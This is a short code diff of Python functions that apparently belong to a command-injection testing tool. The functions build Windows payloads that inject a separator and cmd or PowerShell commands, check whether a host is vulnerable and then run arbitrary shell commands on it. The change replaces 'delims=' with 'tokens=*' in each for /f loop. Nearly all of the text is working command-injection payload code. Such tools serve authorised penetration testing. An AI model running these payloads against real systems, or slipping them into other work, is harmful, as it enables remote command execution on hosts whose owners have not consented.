@@ -27,7 +27,7 @@ Classic decision payload (check if host is vulnerable).
 def decision(separator, TAG, randv1, randv2):
   if settings.TARGET_OS == "win":
     payload = (separator +
-              "for /f \"delims=\" %i in ('cmd /c \"" + 
+              "for /f \"tokens=*\" %i in ('cmd /c \"" + 
               "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
               "\"') do @set /p = " + TAG + "%i" + TAG + TAG + "< nul"
               )
@@ -50,7 +50,7 @@ def decision_alter_shell(separator, TAG, randv1, randv2):
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_DIR + " -c \"print '" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "'\""
     payload = (separator +
-              "for /f \"delims=\" %i in ('cmd /c " + 
+              "for /f \"tokens=*\" %i in ('cmd /c " + 
               python_payload +
               "') do @set /p =%i< nul"
               )
@@ -66,7 +66,7 @@ Execute shell commands on vulnerable host.
 def cmd_execution(separator, TAG, cmd):
   if settings.TARGET_OS == "win":
     payload = (separator +
-              "for /f \"delims=\" %i in ('cmd /c \"" + 
+              "for /f \"tokens=*\" %i in ('cmd /c \"" + 
               cmd + 
               "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + "< nul"
               )
@@ -93,7 +93,7 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
                 )
     else:
       payload = (separator +
-                "for /f \"delims=\" %i in ('" + 
+                "for /f \"tokens=*\" %i in ('" + 
                 settings.WIN_PYTHON_DIR + " -c \"import os; os.system('powershell.exe -InputFormat none write-host " + TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
                 "') do @set /p =%i< nul"
                 )
